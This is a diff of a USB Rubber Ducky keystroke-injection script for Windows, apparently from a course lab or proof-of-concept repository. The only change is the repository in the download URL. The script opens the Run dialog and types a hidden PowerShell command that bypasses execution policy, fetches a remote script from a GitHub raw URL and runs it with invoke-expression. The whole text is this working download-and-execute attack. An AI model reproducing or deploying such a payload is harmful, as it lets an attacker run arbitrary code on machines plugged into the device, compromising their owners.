@@ -2,5 +2,5 @@ REM Made for windows
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/tierChampion/INF8108-TP1-Usb/master/nice.ps1?dl=1; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/tierChampion/DuckyPOC/master/nice.ps1?dl=1; invoke-expression $pl
 ENTER
